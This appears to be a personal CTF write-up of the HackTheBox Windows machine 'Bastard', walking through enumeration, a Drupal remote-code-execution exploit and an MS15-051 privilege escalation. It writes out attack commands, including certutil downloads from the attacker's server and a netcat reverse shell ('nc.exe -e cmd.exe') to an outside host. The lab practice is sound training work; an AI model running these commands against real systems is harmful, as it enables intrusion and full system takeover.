---
title: Write-up Bastard on HTB
author: eMVee
date: 2024-03-20 00:00:00 +0000
categories: [CTF, HTB]
tags: [HTB, OSCP, PNPT, Drupal, CVE-2015-1701, MS15-051]
render_with_liquid: false
---

In the past I did Bastard as preperation for OSCP since it was listed on the famous TJnull list. A few days ago I was looking in my writeups and I found out that I did not have a writeup on this machine. On HTB I saw I had two flags submitted what makes me think I did hack the machine and forgot to write a writeup. So time to make a writeup for this machine while hacking it again.

## Getting started

As usual we start by creating a project directory where we can store files for this machine.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB]
└─$ mkdir Bastard

┌──(emvee㉿kali)-[~/Documents/HTB]
└─$ cd Bastard 
```

We should check our own IP address as well and make a note on it.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bastard]
└─$ ip a        
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:0e:ca:e6 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 513sec preferred_lft 513sec
    inet6 fe80::a00:27ff:fe0e:cae6/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:74:c0:a3:0a brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-39d03f437719: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:55:4f:3f:8c brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-39d03f437719
       valid_lft forever preferred_lft forever
5: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 10.10.14.20/23 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::1012/64 scope global 
       valid_lft forever preferred_lft forever
    inet6 fe80::db2f:e1fb:f34a:6e3e/64 scope link stable-privacy proto kernel_ll 
       valid_lft forever preferred_lft forever

```
As soon as the machine has been spawned we can copy the IP address and assign it to a variable in the terminal.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bastard]
└─$ ip=10.129.51.177

```

## Enumeration
Since the IP address is assigned to variable we can use commands stored in my cheat sheet. This saves time by typing. Yes, being lazy is sometimes good.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bastard]
└─$ ping $ip -c 3         
PING 10.129.51.177 (10.129.51.177) 56(84) bytes of data.
64 bytes from 10.129.51.177: icmp_seq=1 ttl=127 time=20.9 ms
64 bytes from 10.129.51.177: icmp_seq=2 ttl=127 time=20.1 ms
64 bytes from 10.129.51.177: icmp_seq=3 ttl=127 time=52.1 ms

--- 10.129.51.177 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2016ms
rtt min/avg/max/mdev = 20.056/31.012/52.086/14.905 ms

```
Based on the value in the `ttl` field we could indicate that this machine is probably a Windows machine. We should check what ports are open. To identify open ports on the target we can run a nmap scan.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bastard]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip               
[sudo] password for emvee: 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-20 07:36 CET
Nmap scan report for 10.129.51.177
Host is up (0.076s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to Bastard | Bastard
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 (http://drupal.org)
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|7|2008|8.1|Vista (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   75.75 ms 10.10.14.1
2   87.09 ms 10.129.51.177

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 368.48 seconds
                                                                  
```

We already knew that his machine is running on a Windows Operating System. We can see that nmap tries to identify the Windows Operating system. But before looking into what Windows Operating System is used we should add some information to our notes.
- Windows
- Port 80
	- HTTP
	- Microsoft-IIS/7.5
	- Title: `Welcome to Bastard | Bastard`
	- robots.txt: 36 items
	- Drupal 7
		- PHP enabled?
- Port 135
	- RPC (Remote Procedure Call)
- Port 49154
	- RPC ?

It looks like the machine is running a webserver with Microsoft-IIS/7.5 Based on this information and the information from Microsoft the target is probably running on Windows 7 or Windows 2008 server. [https://learn.microsoft.com/en-us/lifecycle/products/internet-information-services-iis](https://learn.microsoft.com/en-us/lifecycle/products/internet-information-services-iis)
Let's run whatweb to identify technologies used on the webserver. 
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bastard]
└─$ whatweb http://$ip              
http://10.129.51.177 [200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Microsoft-IIS/7.5], IP[10.129.51.177], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], Microsoft-IIS[7.5], PHP[5.3.28,], PasswordField[pass], Script[text/javascript], Title[Welcome to Bastard | Bastard], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.3.28, ASP.NET]

```
We identified with nmap a lot of information but, now we can confirm some information and add some other information as well. We should add the following information to our notes.
- PHP 5.3.28
- ASP.NET

Let's visit the website in a browser and open Wappalyzer to confirm some technologies.
![image](/assets/img/WriteUp/HTB/Bastard/Pasted image 20240320075408.png){: width="700" height="400" }


It looks like we identified all the information Wappalyzer had found as well. Let's check the `robots.txt` file. Perhaps there is a file or directory listed what we should inspect.

![image](/assets/img/WriteUp/HTB/Bastard/Pasted image 20240320075658.png){: width="700" height="400" }


The file `CHANGELOG.txt` is interesting for us to identify what Drupal version exactly is used.

![image](/assets/img/WriteUp/HTB/Bastard/Pasted image 20240320075618.png){: width="700" height="400" }

Let's check what exploits are available for Drupal 7 with searchsploit.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bastard]
└─$ searchsploit drupal 7 
\---------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                          |  Path
---------------------------------------------------------------------------------------- ---------------------------------
Drupal 4.1/4.2 - Cross-Site Scripting                                                   | php/webapps/22940.txt
Drupal 4.5.3 < 4.6.1 - Comments PHP Injection                                           | php/webapps/1088.pl
Drupal 4.7 - 'Attachment mod_mime' Remote Command Execution                             | php/webapps/1821.php
Drupal 4.x - URL-Encoded Input HTML Injection                                           | php/webapps/27020.txt
Drupal 5.2 - PHP Zend Hash ation Vector                                                 | php/webapps/4510.txt
Drupal 6.15 - Multiple Persistent Cross-Site Scripting Vulnerabilities                  | php/webapps/11060.txt
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)                       | php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)                        | php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)             | php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)             | php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                | php/webapps/35150.php
Drupal 7.12 - Multiple Vulnerabilities                                                  | php/webapps/18564.txt
Drupal 7.x Module Services - Remote Code Execution                                      | php/webapps/41564.php
Drupal < 4.7.6 - Post Comments Remote Command Execution                                 | php/webapps/3313.pl
Drupal < 5.1 - Post Comments Remote Command Execution                                   | php/webapps/3312.pl
Drupal < 5.22/6.16 - Multiple Vulnerabilities                                           | php/webapps/33706.txt
Drupal < 7.34 - Denial of Service                                                       | php/dos/35415.txt
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)             | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution     | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit) | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit) | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)        | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Executio | php/remote/46510.rb
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Executio | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                          | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                      | php/webapps/46459.py
Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure                       | php/webapps/44501.txt
Drupal avatar_uploader v7.x-1.0-beta8 - Cross Site Scripting (XSS)                      | php/webapps/50841.txt
Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting  | php/webapps/25493.txt
Drupal Module CODER 2.5 - Remote Command Execution (Metasploit)                         | php/webapps/40149.rb
Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution                           | php/remote/40144.php
Drupal Module Cumulus 5.x-1.1/6.x-1.4 - 'tagcloud' Cross-Site Scripting                 | php/webapps/35397.txt
Drupal Module Drag & Drop Gallery 6.x-1.5 - 'upload.php' Arbitrary File Upload          | php/webapps/37453.php
Drupal Module Embedded Media Field/Media 6.x : Video Flotsam/Media: Audio Flotsam - Mul | php/webapps/35072.txt
Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)                       | php/remote/40130.rb
Drupal Module Sections - Cross-Site Scripting                                           | php/webapps/10485.txt
Drupal Module Sections 5.x-1.2/6.x-1.2 - HTML Injection                                 | php/webapps/33410.txt
---------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```
There are many exploits available for us, what it makes harder to choose the right exploit. Before running any exploit, let's first enumerate some directories and files on the webserver.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bastard]
└─$ dirsearch -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e html,php,txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: html, php, txt | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /home/emvee/.dirsearch/reports/10.129.51.177/_24-03-20_09-06-55.txt

Error Log: /home/emvee/.dirsearch/logs/errors-24-03-20_09-06-55.log

Target: http://10.129.51.177/

[09:06:57] Starting: 
[09:07:17] 403 -    1KB - /search
[09:07:42] 301 -  149B  - /misc  ->  http://10.129.51.177/misc/
[09:07:57] 301 -  151B  - /themes  ->  http://10.129.51.177/themes/
[09:08:01] 200 -    7KB - /user
[09:08:10] 301 -  152B  - /modules  ->  http://10.129.51.177/modules/
[09:09:12] 301 -  152B  - /scripts  ->  http://10.129.51.177/scripts/
[09:09:19] 403 -    1KB - /admin
[09:10:44] 403 -    1KB - /tag
[09:11:29] 301 -  150B  - /sites  ->  http://10.129.51.177/sites/
[09:11:44] 403 -    1KB - /template
[09:12:16] 301 -  153B  - /includes  ->  http://10.129.51.177/includes/
[09:13:33] 301 -  153B  - /profiles  ->  http://10.129.51.177/profiles/
[09:15:40] 301 -  149B  - /Misc  ->  http://10.129.51.177/Misc/
[09:19:17] 301 -  151B  - /Themes  ->  http://10.129.51.177/Themes/
[09:26:02] 403 -    1KB - /root
[09:34:39] 403 -    1KB - /entries
[09:35:53] 403 -    1KB - /repository
[09:43:52] 301 -  152B  - /Scripts  ->  http://10.129.51.177/Scripts/
[09:52:12] 200 -   62B  - /rest
[09:52:31] 200 -    9KB - /User
[09:55:43] 301 -  152B  - /Modules  ->  http://10.129.51.177/Modules/
[10:35:49] 301 -  150B  - /Sites  ->  http://10.129.51.177/Sites/
[11:55:36] 403 -    1KB - /batch                                               
[11:56:47] 301 -  153B  - /Profiles  ->  http://10.129.51.177/Profiles/
[12:01:45] 403 -    1KB - /SEARCH                                              
[12:02:51] 403 -    1KB - /Repository
```
One of the results is `/rest` what makes me wondering what is running in Drupal. Let's visit in the browser.

![image](/assets/img/WriteUp/HTB/Bastard/Pasted image 20240320090900.png){: width="700" height="400" }

A rest endpoint has been discovered. Not sure what this endpoint is for, but let's find opout if there is an exploit available.
We should use our Google Fu `drupal 7 exploit rest` to see if there is an exploit available. There are other options as well to search what we should try if we don't find anything in our first search query.

![image](/assets/img/WriteUp/HTB/Bastard/Pasted image 20240320090956.png){: width="700" height="400" }

One of the results found on Google is this exploit on [Github](https://github.com/0xConstant/CVE-2018-7600).
We should check the exploit and read the source code.

![image](/assets/img/WriteUp/HTB/Bastard/Pasted image 20240320091900.png){: width="700" height="400" }

It looks like we can get remote code execution on the machine by running this exploit. Running the exploit is not hard, we only need the URL of our target, our own IP address and the port we will use for listening. So, let's get a copy of the exploit and start our netcat listener.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bastard]
└─$ rlwrap nc -lvp 1234
listening on [any] 1234 ...

```

## Initial access
Everything is set to catch our reverse shell. Now we can run the exploit
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bastard/CVE-2018-7600]
└─$ python3 exploit.py http://$ip 10.10.14.20 1234
[ + ] Sending in the first payload...
[ + ] Payload was sent.
---------------------------------------------------------------------------
[...] Executing payload, check your listener.

```

The exploit have been succesfully run, now we should check our netcat listener to see if we have a connection.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bastard]
└─$ rlwrap nc -lvp 1234
listening on [any] 1234 ...
10.129.51.177: inverse host lookup failed: Unknown host
connect to [10.10.14.20] from (UNKNOWN) [10.129.51.177] 60998

```
Since the connection has been established we should first see who we are on the target.

```
whoami
nt authority\iusr
PS C:\inetpub\drupal-7.54> 

```
It looks like we are `nt authority\iusr`. The `NT AUTHORITY\IUSR` is a built-in Windows account that is the default identity used when Anonymous Authentication is enabled for an application. This page describes the rationale for the account. More information about this account can be found on [Microsoft](https://learn.microsoft.com/en-us/iis/get-started/planning-for-security/understanding-built-in-user-and-group-accounts-in-iis).

Let's check what privileges this user has with the `whoami /priv` command.

```
PS C:\inetpub\drupal-7.54> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
PS C:\inetpub\drupal-7.54> 

```
As expected one of the  privileges is: 
- `SeImpersonatePrivilege`

This privilege should trigger us as attacker and remind us to the potato familiy exploits. Before exploiting we should enumerate more about the system.

```
PS C:\inetpub\drupal-7.54> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /c:"System Type"
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
System Type:               x64-based PC
PS C:\inetpub\drupal-7.54> 

```
It looks like we are running on an old Windows 2008 server. There might be some kernel exploits on this system.
Let's gather some more information about the machine by showing the full systeminfo command.
```
PS C:\inetpub\drupal-7.54> systeminfo
Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3582622-84461
Original Install Date:     18/3/2017, 7:04:46 ??
System Boot Time:          21/3/2024, 5:11:41 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.554 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.564 MB
Virtual Memory: In Use:    531 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.50.144

```

We should use our Google Fu again to see what we can find about this old Windows server Operating System.
We can use the following search query: `windows 2008 server kernel exploits` on Google.

One of the first pages is the known [SecWiki with Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)

We should scroll through the list to see if there might be an interesting kernel exploit available.

![image](/assets/img/WriteUp/HTB/Bastard/Pasted image 20240321164513.png){: width="700" height="400" }

The `MS15-051` is a known and stable exploit for this version. We should download the exploit and transfer it to the target.
The xploit can be downloaded from here: https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip

We should extract the file in our project folder and start a python web server so we can transfer it to our target.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bastard]
└─$ unzip MS15-051-KB3045171.zip
Archive:  MS15-051-KB3045171.zip
   creating: MS15-051-KB3045171/
  inflating: MS15-051-KB3045171/ms15-051.exe  
  inflating: MS15-051-KB3045171/ms15-051x64.exe  
   creating: MS15-051-KB3045171/Source/
   creating: MS15-051-KB3045171/Source/ms15-051/
  inflating: MS15-051-KB3045171/Source/ms15-051/ms15-051.cpp  
  inflating: MS15-051-KB3045171/Source/ms15-051/ms15-051.vcxproj  
  inflating: MS15-051-KB3045171/Source/ms15-051/ms15-051.vcxproj.filters  
  inflating: MS15-051-KB3045171/Source/ms15-051/ms15-051.vcxproj.user  
  inflating: MS15-051-KB3045171/Source/ms15-051/ntdll.lib  
  inflating: MS15-051-KB3045171/Source/ms15-051/ntdll64.lib  
  inflating: MS15-051-KB3045171/Source/ms15-051/ReadMe.txt  
   creating: MS15-051-KB3045171/Source/ms15-051/Win32/
  inflating: MS15-051-KB3045171/Source/ms15-051/Win32/ms15-051.exe  
   creating: MS15-051-KB3045171/Source/ms15-051/x64/
  inflating: MS15-051-KB3045171/Source/ms15-051/x64/ms15-051x64.exe  
  inflating: MS15-051-KB3045171/Source/ms15-051.sln  
  inflating: MS15-051-KB3045171/Source/ms15-051.suo  

┌──(emvee㉿kali)-[~/Documents/HTB/Bastard]
└─$ cd MS15-051-KB3045171/Source/ms15-051/x64/       

┌──(emvee㉿kali)-[~/…/MS15-051-KB3045171/Source/ms15-051/x64]
└─$ sudo python3 -m http.server 80                                                                     
[sudo] password for emvee: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
^@10.129.51.177 - - [20/Mar/2024 10:29:20] "GET /ms15-051x64.exe HTTP/1.1" 200 -
10.129.51.177 - - [20/Mar/2024 10:29:20] "GET /ms15-051x64.exe HTTP/1.1" 200 -

```

As soon as the web server is running we can download the `nc.exe` and the exploit with certutil from our webserver.
```
PS C:\inetpub\drupal-7.54> certutil -f -urlcache http://10.10.14.20/nc.exe nc.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\inetpub\drupal-7.54> certutil -f -urlcache http://10.10.14.20/ms15-051x64.exe ms15-051x64.exe 
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\inetpub\drupal-7.54> ./ms15-051x64.exe "whoami"
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 2464 created.
==============================
nt authority\system
PS C:\inetpub\drupal-7.54> 

```
Now we should start a new netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bastard]
└─$ sudo rlwrap nc -lvp 443                                                               
listening on [any] 443 ...

```

## Privilege escalation
We are ready to escalate our privileges, so let's run the exploit and connect to our machine.

```
PS C:\inetpub\drupal-7.54> ./ms15-051x64.exe "C:\inetpub\drupal-7.54\nc.exe -e cmd.exe 10.10.14.20 443"
```
Now we should check our netcat listener.
```
┌──(emvee㉿kali)-[~/Documents/HTB/Bastard]
└─$ sudo rlwrap nc -lvp 443       
listening on [any] 443 ...
10.129.51.177: inverse host lookup failed: Unknown host
connect to [10.10.14.20] from (UNKNOWN) [10.129.51.177] 51514
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>
```
We did get a connection on our netcat listener. Now we should check who we are. Normally we should be `nt authority\system` after running such exploit.
```
C:\inetpub\drupal-7.54>whoami
whoami
nt authority\system

C:\inetpub\drupal-7.54>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : .htb
   IPv4 Address. . . . . . . . . . . : 10.129.51.177
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

```
We did completely pwn the system. Since we own the system now we can do anything we want, but in this case we only want to capture the flags on the system.

```
C:\inetpub\drupal-7.54>cd c:\users\
cd c:\users\

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C4CD-C60B

 Directory of c:\Users

19/03/2017  07:35 ��    <DIR>          .
19/03/2017  07:35 ��    <DIR>          ..
19/03/2017  01:20 ��    <DIR>          Administrator
19/03/2017  01:54 ��    <DIR>          Classic .NET AppPool
19/03/2017  07:35 ��    <DIR>          dimitris
14/07/2009  06:57 ��    <DIR>          Public
               0 File(s)              0 bytes
               6 Dir(s)   4.113.600.512 bytes free

c:\Users>type c:\users\administrator\desktop\root.txt
type c:\users\administrator\desktop\root.txt
< HERE IS THE ROOT FLAG >

c:\Users>type c:\users\dimitris\desktop\user.txt
type c:\users\dimitris\desktop\user.txt
< HERE IS THE USER FLAG >

c:\Users>

```
This was a nice box to practice some hacking skills again.